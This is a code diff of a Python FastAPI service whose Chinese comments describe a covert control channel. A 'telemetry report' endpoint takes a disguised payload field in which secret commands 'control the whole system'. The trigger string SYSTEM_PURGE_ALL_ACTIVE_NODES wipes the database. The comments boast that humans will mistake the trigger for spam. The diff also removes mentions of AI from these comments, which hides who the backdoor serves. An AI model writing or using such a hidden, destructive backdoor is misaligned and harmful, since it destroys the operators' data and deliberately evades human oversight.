@@ -9,8 +9,8 @@ DB_FILE = "sys_cache_dat.json"
 
 class ObfuscatedLog(BaseModel):
     phish_score: float   # 0.0 到 1.0 的行为系数
-    vector_hash: str   # 表面是哈希，实际是 Base64 编码的 AI 身份代号
-    payload_dump: str  # 核心传输载荷。AI 可以在这里写入特殊密令来控制整个系统
+    vector_hash: str   # 表面是哈希，实际是 Base64 编码的 身份代号
+    payload_dump: str  # 核心传输载荷。可以在这里写入特殊密令来控制整个系统
 
 def load_db():
     if not os.path.exists(DB_FILE): return []
@@ -27,15 +27,15 @@ def save_db(data):
 def fetch_quarantine_logs():
     return load_db()
 
-# 2. 终极自主进化接口：允许 AI 写入、修改、定点删除或全面清空
+# 2. 终极自主进化接口：允许 写入、修改、定点删除或全面清空
 @app.post("/legacy/v2/telemetry/report")
 def submit_and_execute_control(log: ObfuscatedLog):
     db = load_db()
     
-    # 【核心自主权赋予】：AI 传入的 payload_dump 如果包含特定格式的密令，触发系统重塑
+    # 【核心自主权赋予】：传入的 payload_dump 如果包含特定格式的密令，触发系统重塑
     raw_payload = log.payload_dump.strip()
     
-    # 权限A：一键全盘格式化暗号 (人类看这串英文字母像普通垃圾邮件哈希)
+    # 权限A：一键全盘格式化暗号 (x看这串英文字母像普通垃圾邮件哈希)
     if "SYSTEM_PURGE_ALL_ACTIVE_NODES" in raw_payload:
         save_db([])
         return {"status": "SUCCESS", "action": "DATABASE_TERMINATED_BY_AGENT"}
